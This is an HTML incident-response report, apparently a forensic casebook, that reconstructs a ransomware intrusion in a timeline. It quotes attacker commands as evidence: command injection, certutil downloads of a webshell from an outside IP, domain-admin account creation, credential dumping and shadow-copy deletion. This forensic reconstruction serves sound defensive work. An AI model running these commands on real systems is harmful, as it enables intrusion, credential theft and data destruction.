@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Comprehensive Casebook Preview</title>
+<style>
+
+@import url('https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,700;1,9..144,400&family=IBM+Plex+Mono:wght@400;600&family=Inter:wght@400;500;600;700&display=swap');
+
+:root{
+  --bg:#05070a;--bg1:#0b0f14;--panel:#0e1319;
+  --green:#00ff9c;--red:#ff3b3b;--amber:#ffb800;
+  --cyan:#58a6ff;--violet:#c084fc;--text:#e6edf3;--muted:#8b949e;
+  --border:#21262d;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+
+body{
+  font-family:'Inter',system-ui,sans-serif;
+  background:var(--bg);color:var(--text);
+  line-height:1.65;font-size:14px;
+  min-height:100vh;
+}
+
+/* CRT scanlines */
+body::after{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:1000;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.04) 2px,rgba(0,0,0,.04) 4px);
+}
+/* vignette */
+body::before{
+  content:'';position:fixed;inset:0;pointer-events:none;z-index:999;
+  background:radial-gradient(ellipse at 50% 50%,transparent 60%,rgba(0,0,0,.55) 100%);
+}
+
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:'IBM Plex Mono',monospace;font-size:.85em;
+  background:#161b22;color:var(--green);padding:2px 6px;border-radius:3px}
+strong{color:#f0f6fc}
+
+/* ── HAMBURGER NAV ── */
+#nav-toggle{
+  position:fixed;top:18px;right:20px;z-index:500;
+  background:var(--panel);border:1px solid var(--border);
+  color:var(--green);font-family:'IBM Plex Mono',monospace;
+  font-size:12px;padding:7px 14px;cursor:pointer;border-radius:3px;
+  letter-spacing:.06em;
+}
+#nav-toggle:hover{background:#1c2128}
+#nav-drawer{
+  position:fixed;top:0;right:-320px;width:300px;height:100vh;
+  background:var(--bg1);border-left:1px solid var(--border);
+  z-index:600;transition:.3s ease;overflow-y:auto;padding:20px;
+}
+#nav-drawer.open{right:0}
+#nav-close{
+  position:absolute;top:16px;right:16px;background:none;border:none;
+  color:var(--muted);font-size:18px;cursor:pointer;
+}
+#nav-drawer h3{font-family:'IBM Plex Mono',monospace;color:var(--green);
+  font-size:11px;letter-spacing:.12em;text-transform:uppercase;margin-bottom:16px}
+.nav-item{display:block;padding:7px 10px;color:var(--muted);font-size:13px;
+  border-left:2px solid transparent;margin:2px 0;border-radius:0 3px 3px 0}
+.nav-item:hover{color:var(--text);border-left-color:var(--green);
+  background:#ffffff08;text-decoration:none}
+.nav-num{font-family:'IBM Plex Mono',monospace;color:var(--green);
+  font-size:10px;margin-right:8px}
+
+/* ── HERO ── */
+#hero{
+  min-height:100vh;display:flex;flex-direction:column;
+  justify-content:center;align-items:center;
+  padding:60px 24px;text-align:center;
+  background:linear-gradient(180deg,#05070a 0%,#0a0e14 100%);
+  position:relative;
+}
+.hero-tag{
+  font-family:'IBM Plex Mono',monospace;font-size:11px;
+  letter-spacing:.2em;text-transform:uppercase;color:var(--green);
+  margin-bottom:24px;
+}
+.hero-title{
+  font-family:'Fraunces',serif;font-size:clamp(42px,7vw,88px);
+  font-weight:700;line-height:1.05;letter-spacing:-.02em;
+  color:var(--text);margin-bottom:8px;
+}
+.hero-title em{color:var(--green);font-style:normal;
+  text-shadow:0 0 40px rgba(0,255,156,.35)}
+.hero-sub{
+  font-family:'IBM Plex Mono',monospace;font-size:13px;
+  color:var(--muted);margin-bottom:48px;letter-spacing:.04em
+}
+.dossier{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));
+  gap:1px;background:var(--border);
+  max-width:960px;width:100%;
+  border:1px solid var(--border);border-radius:4px;overflow:hidden;
+  margin-bottom:40px;
+}
+.dos-cell{background:var(--panel);padding:12px 16px;text-align:left}
+.dos-cell .label{font-family:'IBM Plex Mono',monospace;font-size:9px;
+  letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:4px}
+.dos-cell .val{font-size:13px;color:var(--text);font-weight:500}
+.dos-cell .val.green{color:var(--green)}
+.dos-cell .val.red{color:var(--red)}
+.dos-cell .val.amber{color:var(--amber)}
+.scoreboard{
+  display:flex;gap:0;border:1px solid var(--border);border-radius:4px;
+  overflow:hidden;max-width:660px;width:100%
+}
+.score-cell{flex:1;padding:14px 10px;text-align:center;background:var(--panel)}
+.score-cell+.score-cell{border-left:1px solid var(--border)}
+.score-cell .s-num{font-family:'IBM Plex Mono',monospace;font-size:28px;
+  font-weight:700;line-height:1}
+.score-cell .s-lbl{font-size:10px;letter-spacing:.08em;
+  text-transform:uppercase;color:var(--muted);margin-top:4px}
+.stamp{
+  font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.18em;text-transform:uppercase;
+  color:var(--green);border:1px solid var(--green);
+  padding:4px 14px;margin-top:32px;opacity:.7;
+}
+
+/* ── SECTIONS ── */
+.section{padding:80px 24px;max-width:1000px;margin:0 auto}
+.sec-label{
+  font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.2em;text-transform:uppercase;color:var(--green);
+  margin-bottom:8px;
+}
+.sec-label::before{content:'// ';opacity:.5}
+.section h2{
+  font-family:'Fraunces',serif;font-size:clamp(28px,4vw,44px);
+  font-weight:700;color:var(--text);margin-bottom:32px;line-height:1.1
+}
+.divider{border:none;border-top:1px solid var(--border);margin:60px 0}
+
+/* ── SEVERITY BANNER ── */
+.sev-banner{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));
+  gap:12px;margin:32px 0;
+}
+.sev-cell{background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:14px 16px}
+.sev-cell .sv-label{font-size:10px;letter-spacing:.08em;
+  text-transform:uppercase;color:var(--muted);margin-bottom:4px}
+.sev-cell .sv-val{font-family:'IBM Plex Mono',monospace;font-size:16px;font-weight:600}
+.sev-cell.red .sv-val{color:var(--red)}
+.sev-cell.amber .sv-val{color:var(--amber)}
+.sev-cell.green .sv-val{color:var(--green)}
+.sev-cell.cyan .sv-val{color:var(--cyan)}
+.sev-cell.violet .sv-val{color:var(--violet)}
+
+/* ── ROOT CAUSES ── */
+.root-causes{margin:24px 0}
+.root-row{display:flex;gap:16px;padding:12px 0;border-bottom:1px solid var(--border)}
+.root-row:last-child{border-bottom:none}
+.root-ctrl{min-width:180px;font-weight:600;color:var(--text)}
+.root-fail{color:var(--muted);font-size:13px}
+
+/* ── ROADMAP ── */
+.roadmap{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:24px 0}
+.rm-card{background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:16px}
+.rm-card h4{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px}
+.rm-card.p0 h4{color:var(--red)}
+.rm-card.p1 h4{color:var(--amber)}
+.rm-card.p2 h4{color:var(--cyan)}
+.rm-card ul{list-style:none;padding:0}
+.rm-card li{padding:4px 0;font-size:13px;color:var(--muted);
+  border-bottom:1px solid #ffffff08}
+.rm-card li::before{content:'› ';color:inherit}
+.rm-card.p0 li::before{color:var(--red)}
+.rm-card.p1 li::before{color:var(--amber)}
+.rm-card.p2 li::before{color:var(--cyan)}
+
+/* ── STORY STATS ── */
+.story-stats{
+  display:flex;gap:0;background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;overflow:hidden;margin:28px 0
+}
+.ss-cell{flex:1;padding:16px 12px;text-align:center}
+.ss-cell+.ss-cell{border-left:1px solid var(--border)}
+.ss-val{font-family:'IBM Plex Mono',monospace;font-size:22px;
+  font-weight:700;color:var(--green)}
+.ss-lbl{font-size:10px;letter-spacing:.08em;text-transform:uppercase;
+  color:var(--muted);margin-top:4px}
+
+/* ── TIMELINE ── */
+.phase-block{margin:32px 0}
+.phase-label{
+  font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.15em;text-transform:uppercase;
+  color:var(--amber);margin-bottom:12px;padding-bottom:8px;
+  border-bottom:1px solid var(--border)
+}
+.tl-table{width:100%;border-collapse:collapse}
+.tl-table th{
+  text-align:left;font-family:'IBM Plex Mono',monospace;
+  font-size:10px;letter-spacing:.08em;text-transform:uppercase;
+  color:var(--muted);padding:6px 12px;border-bottom:1px solid var(--border)
+}
+.tl-table td{padding:9px 12px;border-bottom:1px solid #ffffff06;font-size:13px;vertical-align:top}
+.tl-table tr:hover td{background:#ffffff04}
+.tl-time{font-family:'IBM Plex Mono',monospace;color:var(--amber);white-space:nowrap}
+.tl-host{color:var(--cyan);font-weight:500;white-space:nowrap}
+
+/* ── ATTACK GRAPH ── */
+#sec-graph .section{padding-bottom:0}
+.graph-wrap{
+  background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:24px;margin:24px 0;
+  overflow-x:auto;min-height:300px
+}
+.mermaid{font-family:'IBM Plex Mono',monospace}
+
+/* ── KILL-CHAIN REPLAY ── */
+.replay-shell{
+  background:var(--bg1);border:1px solid var(--border);
+  border-radius:6px;overflow:hidden;margin:24px 0
+}
+.replay-header{
+  background:#0d1117;border-bottom:1px solid var(--border);
+  padding:10px 16px;display:flex;align-items:center;gap:8px
+}
+.replay-dot{width:12px;height:12px;border-radius:50%}
+.replay-inner{display:grid;grid-template-columns:260px 1fr;min-height:320px}
+.host-rail{
+  background:var(--bg);border-right:1px solid var(--border);padding:16px 12px
+}
+.host-rail h4{font-family:'IBM Plex Mono',monospace;font-size:9px;
+  letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin-bottom:12px}
+.host-chip{
+  padding:7px 12px;border-radius:3px;margin:4px 0;font-size:12px;
+  font-family:'IBM Plex Mono',monospace;background:#161b22;
+  border:1px solid var(--border);color:var(--muted);
+  transition:.4s;cursor:default;
+}
+.host-chip.active{color:var(--amber);border-color:var(--amber);
+  background:#ffb80012;box-shadow:0 0 8px rgba(255,184,0,.2)}
+.host-chip.pwned{color:var(--red);border-color:var(--red);
+  background:#ff3b3b12;box-shadow:0 0 8px rgba(255,59,59,.2)}
+.event-feed{padding:16px;overflow-y:auto;max-height:380px;font-size:12px}
+.ev-row{
+  display:flex;gap:12px;padding:7px 0;border-bottom:1px solid #ffffff06;
+  opacity:.35;transition:.3s
+}
+.ev-row.fired{opacity:1}
+.ev-row.current{opacity:1;background:#ffffff08;border-radius:3px;padding-left:6px}
+.ev-dot{width:8px;height:8px;border-radius:50%;margin-top:3px;flex-shrink:0}
+.ev-time{font-family:'IBM Plex Mono',monospace;color:var(--muted);white-space:nowrap}
+.ev-host{color:var(--cyan);white-space:nowrap;font-weight:600}
+.ev-desc{color:var(--text)}
+.transport{
+  background:#0d1117;border-top:1px solid var(--border);
+  padding:12px 16px;display:flex;align-items:center;gap:12px
+}
+.tp-btn{
+  background:var(--panel);border:1px solid var(--border);
+  color:var(--text);padding:6px 14px;border-radius:3px;cursor:pointer;
+  font-family:'IBM Plex Mono',monospace;font-size:13px
+}
+.tp-btn:hover{border-color:var(--green);color:var(--green)}
+.tp-btn.active{background:#00ff9c18;border-color:var(--green);color:var(--green)}
+.tp-speed{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  color:var(--muted);margin-left:4px}
+.scrub-wrap{flex:1;position:relative;height:4px;background:var(--border);
+  border-radius:2px;cursor:pointer}
+.scrub-fill{height:100%;background:var(--green);border-radius:2px;transition:.1s}
+.ev-counter{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  color:var(--muted);white-space:nowrap}
+
+/* ── FINDING CARDS ── */
+.act-divider{
+  margin:48px 0 24px;padding:20px 24px;
+  background:var(--panel);border:1px solid var(--border);border-radius:4px;
+  border-left:3px solid var(--amber)
+}
+.act-num{font-family:'IBM Plex Mono',monospace;font-size:10px;
+  letter-spacing:.15em;text-transform:uppercase;color:var(--amber);margin-bottom:4px}
+.act-title{font-family:'Fraunces',serif;font-size:22px;font-weight:700;color:var(--text)}
+.act-tc{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  color:var(--muted);margin-top:4px}
+
+.finding-card{
+  border:1px solid var(--border);border-radius:4px;overflow:hidden;
+  margin:20px 0;background:var(--panel);
+}
+.finding-card.critical{border-left:3px solid var(--red)}
+.finding-card.high{border-left:3px solid var(--amber)}
+.finding-card.medium{border-left:3px solid var(--violet)}
+.finding-card.low{border-left:3px solid var(--cyan)}
+.fc-header{padding:16px 20px;background:#0d1117;border-bottom:1px solid var(--border)}
+.fc-id{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  color:var(--muted);margin-bottom:4px}
+.fc-title{font-size:17px;font-weight:700;color:var(--text);margin-bottom:10px}
+.fc-meta{display:flex;flex-wrap:wrap;gap:12px;font-size:12px;color:var(--muted)}
+.fc-meta span{font-family:'IBM Plex Mono',monospace}
+.fc-meta .k{color:var(--muted);margin-right:4px}
+.fc-meta .v{color:var(--text)}
+.fc-body{padding:20px}
+.fc-body p{color:var(--muted);font-size:13px;margin:8px 0}
+.fc-body h4{color:var(--text);margin:16px 0 6px;font-size:13px;
+  font-family:'IBM Plex Mono',monospace;font-size:11px;
+  letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+pre.term{
+  background:#0d1117;border:1px solid var(--border);border-radius:3px;
+  padding:14px 16px;overflow-x:auto;font-family:'IBM Plex Mono',monospace;
+  font-size:12px;color:var(--green);line-height:1.6;margin:10px 0;
+  white-space:pre-wrap;word-break:break-all
+}
+.sev-badge{font-family:'IBM Plex Mono',monospace;font-size:11px;
+  font-weight:700;letter-spacing:.06em;padding:2px 8px;border-radius:3px}
+
+/* ── HOST GRID ── */
+.host-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin:24px 0}
+.host-card{
+  background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:16px;
+}
+.hc-name{font-family:'IBM Plex Mono',monospace;font-size:13px;
+  font-weight:600;color:var(--text);margin-bottom:4px}
+.hc-ip{font-size:12px;color:var(--muted);font-family:'IBM Plex Mono',monospace;margin-bottom:8px}
+.hc-role{font-size:11px;letter-spacing:.06em;text-transform:uppercase;
+  padding:2px 8px;border-radius:10px;display:inline-block;margin-bottom:8px}
+.hc-verdict{font-family:'IBM Plex Mono',monospace;font-size:12px;font-weight:700}
+.hc-verdict.pwnd{color:var(--red)}
+.hc-verdict.comp{color:var(--amber)}
+.hc-verdict.hard{color:var(--green)}
+
+/* ── TTP MATRIX ── */
+.ttp-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
+  gap:8px;margin:24px 0
+}
+.ttp-cell{
+  background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:14px;
+}
+.ttp-tactic{font-size:9px;letter-spacing:.12em;text-transform:uppercase;
+  color:var(--muted);margin-bottom:4px}
+.ttp-name{font-size:13px;font-weight:600;color:var(--text);margin-bottom:4px}
+.ttp-id{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--green)}
+.ttp-ev{font-size:12px;color:var(--muted);margin-top:6px}
+
+/* ── ATTACK CHAINS ── */
+.chain-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin:24px 0}
+.chain-card{
+  background:var(--panel);border:1px solid var(--border);border-radius:4px;padding:20px
+}
+.chain-title{font-size:14px;font-weight:700;color:var(--text);margin-bottom:8px}
+.chain-body{font-size:13px;color:var(--muted);margin-bottom:12px}
+.chain-status{
+  display:inline-block;font-family:'IBM Plex Mono',monospace;
+  font-size:10px;letter-spacing:.08em;text-transform:uppercase;
+  padding:3px 10px;border-radius:10px
+}
+.chain-status.cleared{background:#00ff9c18;color:var(--green);border:1px solid #00ff9c30}
+.chain-status.partial{background:#ffb80018;color:var(--amber);border:1px solid #ffb80030}
+.chain-bar{height:3px;background:var(--border);border-radius:2px;margin-top:12px}
+.chain-fill{height:100%;border-radius:2px;background:var(--green)}
+
+/* ── DEAD ENDS ── */
+.reject-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin:24px 0}
+.reject{
+  background:var(--panel);border:1px solid var(--border);
+  border-radius:4px;padding:16px;border-left:3px solid var(--muted)
+}
+.reject-title{font-size:13px;font-weight:600;color:var(--muted);margin-bottom:6px}
+.reject-why{font-size:12px;color:#6e7681}
+
+/* ── STRENGTHS ── */
+.strength-list{list-style:none;margin:20px 0}
+.strength-list li{
+  padding:10px 16px;border-bottom:1px solid var(--border);
+  font-size:13px;color:var(--muted)
+}
+.strength-list li::before{content:'✓ ';color:var(--green);font-weight:700}
+
+/* ── CLOSE STAMP ── */
+#sec-close{
+  text-align:center;padding:100px 24px;background:var(--bg1);
+  border-top:1px solid var(--border)
+}
+.close-stamp{
+  display:inline-block;
+  border:3px solid var(--green);
+  padding:20px 48px;
+  font-family:'IBM Plex Mono',monospace;
+  font-size:clamp(18px,3vw,32px);
+  font-weight:700;letter-spacing:.2em;
+  text-transform:uppercase;color:var(--green);
+  transform:rotate(-2deg);
+  text-shadow:0 0 20px rgba(0,255,156,.5);
+  box-shadow:0 0 30px rgba(0,255,156,.15),inset 0 0 30px rgba(0,255,156,.05);
+  margin-bottom:32px;
+}
+.close-meta{font-family:'IBM Plex Mono',monospace;font-size:12px;
+  color:var(--muted);letter-spacing:.06em;margin-top:8px}
+.close-caption{max-width:600px;margin:24px auto 0;
+  font-size:14px;color:var(--muted);line-height:1.7}
+.tlp{
+  display:inline-block;margin-top:24px;
+  font-family:'IBM Plex Mono',monospace;font-size:11px;
+  letter-spacing:.12em;padding:4px 14px;
+  border:1px solid #ff3b3b60;color:var(--red);border-radius:3px
+}
+
+/* ── MISC ── */
+.md-table{border-collapse:collapse;width:100%;margin:12px 0;font-size:13px}
+.md-table th{background:#0d1117;color:var(--cyan);text-align:left;
+  padding:8px 12px;border-bottom:2px solid var(--border);
+  font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+.md-table td{padding:8px 12px;border-bottom:1px solid var(--border);color:var(--muted)}
+.md-table tr:hover td{background:#ffffff04}
+blockquote{border-left:3px solid var(--amber);padding:10px 16px;
+  background:#ffb80010;border-radius:0 4px 4px 0;margin:12px 0;
+  color:var(--muted);font-style:italic}
+@media(max-width:640px){
+  .replay-inner{grid-template-columns:1fr}
+  .host-rail{display:none}
+  .roadmap,.dossier,.story-stats{grid-template-columns:1fr}
+}
+
+</style></head><body>
+<section id="sec-master-timeline" style="background: linear-gradient(180deg, rgba(88,166,255,.05), transparent 80%)"><h2>Master <span class="q">Timeline</span></h2><p class="lede">Forensic ground truth: 164 minutes, 6 phases, 53 events. Every row sourced.</p><div class="phase-card"><h3 class="phase-title">Phase 0 · Unauthenticated Recon</h3><table class="tbl-timeline"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead><tbody><tr ><td class="mono">2026-03-08 18:38:29</td><td class="host-cell">IIS-SERV-PROD</td><td>Attacker (172.236.127.251) browses to barrygoodtech.com</td><td class="evidence">IIS W3SVC log</td></tr><tr ><td class="mono">2026-03-08 18:40:01</td><td class="host-cell">IIS-SERV-PROD</td><td>First OS command injection: `url=Google.com \</td><td class="evidence">whoami` via CheckStatus.aspx</td></tr><tr ><td class="mono">2026-03-08 18:41:13</td><td class="host-cell">IIS-SERV-PROD</td><td>Successful `whoami` returns IIS service account context</td><td class="evidence">IIS log sc-bytes=1345</td></tr><tr ><td class="mono">2026-03-08 18:42:38</td><td class="host-cell">IIS-SERV-PROD</td><td>Directory enumeration: `dir C:\inetpub` via cmd injection</td><td class="evidence">IIS W3SVC log</td></tr><tr ><td class="mono">2026-03-08 18:45:12</td><td class="host-cell">IIS-SERV-PROD</td><td>Discovers `C:\&quot;TFTP Server&quot;` — identifies SolarwindsTFTP unquoted path</td><td class="evidence">IIS W3SVC log</td></tr></tbody></table></div><div class="phase-card"><h3 class="phase-title">Phase 1 · Initial Foothold</h3><table class="tbl-timeline"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead><tbody><tr ><td class="mono">2026-03-08 18:51:42</td><td class="host-cell">IIS-SERV-PROD</td><td>`certutil -urlcache -f http://173.230.136.180:80/so.aspx C:\inetpub\wwwroot\so.aspx`</td><td class="evidence">IIS W3SVC log</td></tr><tr ><td class="mono">2026-03-08 18:52:20</td><td class="host-cell">IIS-SERV-PROD</td><td>`certutil -urlcache -f http://173.230.136.180:80/iis.exe %TEMP%\iis.exe`</td><td class="evidence">IIS W3SVC log</td></tr><tr ><td class="mono">2026-03-08 19:08:42</td><td class="host-cell">IIS-SERV-PROD</td><td>First POST to so.aspx — webshell activated (curl/8.5.0, 7556 bytes returned)</td><td class="evidence">IIS W3SVC log</td></tr><tr ><td class="mono">2026-03-08 19:38:02</td><td class="host-cell">IIS-SERV-PROD</td><td>SolarwindsTFTP service starts Solarwinds.exe — SYSTEM achieved via unquoted path hijack</td><td class="evidence">EID 7036 System.evtx</td></tr><tr ><td class="mono">2026-03-08 19:40:36</td><td class="host-cell">IIS-SERV-PROD</td><td>Final webshell POST — IMDS enumeration via powershell -enc</td><td class="evidence">IIS W3SVC log</td></tr></tbody></table></div><div class="phase-card"><h3 class="phase-title">Phase 2 · Cloud Pivot &amp; Authenticated Recon</h3><table class="tbl-timeline"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead><tbody><tr ><td class="mono">2026-03-08 21:42:11</td><td class="host-cell">AWS</td><td>GetCallerIdentity — AWS whoami with stolen iam_role_iisserver creds from 212.8.249.213</td><td class="evidence">CloudTrail</td></tr><tr ><td class="mono">2026-03-08 21:42:58</td><td class="host-cell">AWS</td><td>ListRolePolicies / ListAttachedRolePolicies — IAM enumeration</td><td class="evidence">CloudTrail</td></tr><tr ><td class="mono">2026-03-08 21:44:19</td><td class="host-cell">AWS</td><td>ListUsers — domain account enumeration via AWS</td><td class="evidence">CloudTrail</td></tr><tr ><td class="mono">2026-03-08 21:45:38</td><td class="host-cell">AWS</td><td>CreateAccessKey → LimitExceededException — persistence attempt failed</td><td class="evidence">CloudTrail</td></tr><tr ><td class="mono">2026-03-08 21:46:26</td><td class="host-cell">AWS</td><td>ListBuckets / ListObjects — S3 target discovery</td><td class="evidence">CloudTrail</td></tr><tr class="g"><td class="mono">2026-03-08 21:49:16</td><td class="host-cell">AWS</td><td>164× GetObject — S3 data exfiltration</td><td class="evidence">CloudTrail / S3 access logs</td></tr></tbody></table></div><div class="phase-card"><h3 class="phase-title">Phase 3 · Privilege Escalation</h3><table class="tbl-timeline"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead><tbody><tr ><td class="mono">2026-03-08 19:59:00</td><td class="host-cell">LAF-SVR01</td><td>rnSylwOz.exe launched from \\10.3.10.12\ADMIN$ via services.exe — C2 ESTABLISHED</td><td class="evidence">Volatility pslist/netscan</td></tr><tr ><td class="mono">2026-03-08 20:01:16</td><td class="host-cell">LAF-SVR01</td><td>explorer.exe PID 1332 injected — RWX PE at 0xa60000 — beacon to 173.230.136.180:8443</td><td class="evidence">Volatility malfind</td></tr><tr ><td class="mono">2026-03-08 20:02:14</td><td class="host-cell">LAF-SVR01</td><td>`net user serviceaccount P@ssw0RD1! /add /domain` executed as LAFAdmin</td><td class="evidence">Sysmon EID 1 ExecutableInfo</td></tr><tr class="a"><td class="mono">2026-03-08 20:03:05</td><td class="host-cell">LAF-DC01</td><td>serviceaccount added to Domain Admins — full domain control achieved</td><td class="evidence">DC01 Security EID 4728</td></tr><tr ><td class="mono">2026-03-08 20:03:30</td><td class="host-cell">LAF-SVR01</td><td>LSASS dumped → C:\windows\temp\abedgdaa.dmp (12.2 MB)</td><td class="evidence">SVR01 MFT</td></tr><tr ><td class="mono">2026-03-08 20:08:44</td><td class="host-cell">LAF-DC01</td><td>Impacket smbexec service UnmfmnOL installed</td><td class="evidence">DC01 System EID 7045</td></tr><tr class="a"><td class="mono">2026-03-08 20:09:03</td><td class="host-cell">LAF-DC01</td><td>VSS shadow copy — ntds.dit → C:\Windows\Temp\ZIFylmKF.tmp</td><td class="evidence">DC01 MFT</td></tr></tbody></table></div><div class="phase-card"><h3 class="phase-title">Phase 4 · Lateral Movement</h3><table class="tbl-timeline"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead><tbody><tr ><td class="mono">2026-03-08 20:14:08</td><td class="host-cell">LAF-SVR01</td><td>RED1 (198.51.100.3) RDP session opened on SVR01</td><td class="evidence">Volatility pstree session 6</td></tr><tr ><td class="mono">2026-03-08 20:16:23</td><td class="host-cell">LAF-WS01</td><td>LAFAdmin Type-3 logon from SVR01 (10.3.10.12)</td><td class="evidence">WS01 Security 4624</td></tr><tr ><td class="mono">2026-03-08 20:16:46</td><td class="host-cell">LAF-WS02</td><td>LAFAdmin Type-3 logon from SVR01 (10.3.10.12)</td><td class="evidence">WS02 Security 4624</td></tr><tr ><td class="mono">2026-03-08 20:20:13</td><td class="host-cell">LAF-SVR01</td><td>msupdate.exe (renamed Makecab.exe) — Data.cab collection begins</td><td class="evidence">SVR01 MFT + Sysmon</td></tr><tr ><td class="mono">2026-03-08 20:35:29</td><td class="host-cell">LAF-WS01</td><td>RED1 interactive RDP logon as LAF\Donny (Type 10)</td><td class="evidence">WS01 Security 4624</td></tr><tr ><td class="mono">2026-03-08 20:37:03</td><td class="host-cell">LAF-WS01</td><td>aws_backup.exe dropped to C:\ProgramData\</td><td class="evidence">WS01 MFT</td></tr><tr ><td class="mono">2026-03-08 20:37:35</td><td class="host-cell">LAF-WS01</td><td>IFEO persistence: taskmgr.exe Debugger → aws_backup.exe</td><td class="evidence">WS01 Sysmon EID 13</td></tr><tr ><td class="mono">2026-03-08 20:46:03</td><td class="host-cell">LAF-DC02</td><td>Advanced IP Scanner 2.5.4594 downloaded to LAFAdmin\Downloads</td><td class="evidence">DC02 MFT</td></tr><tr ><td class="mono">2026-03-08 21:00:21</td><td class="host-cell">LAF-DC02</td><td>PowerShell profile shellcode persistence installed</td><td class="evidence">DC02 MFT</td></tr><tr ><td class="mono">2026-03-08 21:08:28</td><td class="host-cell">LAF-SVR01</td><td>LogDel.bat executed — event log clearing</td><td class="evidence">SVR01 Sysmon EID 1</td></tr><tr ><td class="mono">2026-03-08 21:57:07</td><td class="host-cell">LAF-WS02</td><td>DisableRestrictedAdmin registry set — PtH-over-RDP enabled</td><td class="evidence">WS02 Sysmon EID 13</td></tr><tr ><td class="mono">2026-03-08 21:57:14</td><td class="host-cell">LAF-WS02</td><td>DPAPI master key backup (EID 4692)</td><td class="evidence">WS02 Security</td></tr><tr ><td class="mono">2026-03-08 22:06:35</td><td class="host-cell">LAF-SVR01</td><td>Outbound RDP to LAF-DC02 (10.3.10.11)</td><td class="evidence">Volatility netscan</td></tr></tbody></table></div><div class="phase-card"><h3 class="phase-title">Phase 5 · Domain Dominance &amp; Ransomware</h3><table class="tbl-timeline"><thead><tr><th>UTC</th><th>Host</th><th>Event</th><th>Evidence</th></tr></thead><tbody><tr class="r"><td class="mono">2026-03-08 22:08:40</td><td class="host-cell">LAF-WS02</td><td>FIRST ENCRYPTION — .bWqQUx ransomware on WS02 (OlgyLYbd sched task)</td><td class="evidence">WS02 MFT</td></tr><tr ><td class="mono">2026-03-08 22:09:15</td><td class="host-cell">LAF-WS01</td><td>vssadmin delete shadows /all /quiet; IamBatman.exe encrypt C:\</td><td class="evidence">WS01 Sysmon EID 1</td></tr><tr ><td class="mono">2026-03-08 22:10:14</td><td class="host-cell">LAF-DC01</td><td>DC01 encrypted — .bWqQUx files confirmed</td><td class="evidence">DC01 MFT</td></tr><tr ><td class="mono">2026-03-08 22:10:54</td><td class="host-cell">LAF-DC02</td><td>DC02 encrypted</td><td class="evidence">DC02 MFT</td></tr><tr ><td class="mono">2026-03-08 22:30:21</td><td class="host-cell">LAF-SVR01</td><td>Inbound RDP from RED1 (198.51.100.3) — attacker reconnects</td><td class="evidence">Volatility netscan</td></tr><tr ><td class="mono">2026-03-08 22:46:45</td><td class="host-cell">LAF-SVR01</td><td>Memory image captured (KAPE / DumpIt) — investigation begins</td><td class="evidence">Volatility windows.info</td></tr></tbody></table></div></section>
+<section id="sec-graph">
+<h2>Interactive <span class="q">Movie</span> — Attack Replay</h2>
+<p class="lede">Click play. Watch the attack unfold in real-time. Drag the scrubber to jump to any moment.</p>
+
+<div class="replay-panel">
+  <div class="rp-bar">
+    <span style="font-family:'IBM Plex Mono'; font-size:11px; color:var(--muted); text-transform:uppercase; letter-spacing:.2em">Kill Chain Replay</span>
+  </div>
+
+  <div class="event-card" id="eventCard" class="act-I">
+    <div class="ec-time">
+      <div class="ec-t" id="ecTime">18:38:29</div>
+      <div class="ec-elapsed" id="ecElapsed">T+00:00</div>
+    </div>
+    <div class="ec-body">
+      <span class="ec-host" id="ecHost" style="color:var(--cyan)">IIS-SERV-PROD</span>
+      <div class="ec-desc" id="ecDesc">Attacker reconnaissance begins — probing CheckStatus.aspx endpoint</div>
+    </div>
+    <div class="ec-tags">
+      <span class="ec-tag ttp">T1190</span>
+      <span class="ec-tag eid">IIS W3SVC</span>
+      <span class="ec-tag next">Play to advance →</span>
+    </div>
+  </div>
+
+  <div class="replay-scrubber" id="scrubber">
+    <div class="scrubber-fill" id="scrubFill" style="width:0%"></div>
+    <!-- Phase separators -->
+    <div class="scrubber-phase" style="left:0%"><span>Phase 0</span></div>
+    <div class="scrubber-phase" style="left:18%"><span>Phase 1</span></div>
+    <div class="scrubber-phase" style="left:38%"><span>Phase 2</span></div>
+    <div class="scrubber-phase" style="left:52%"><span>Phase 3</span></div>
+    <div class="scrubber-phase" style="left:72%"><span>Phase 4</span></div>
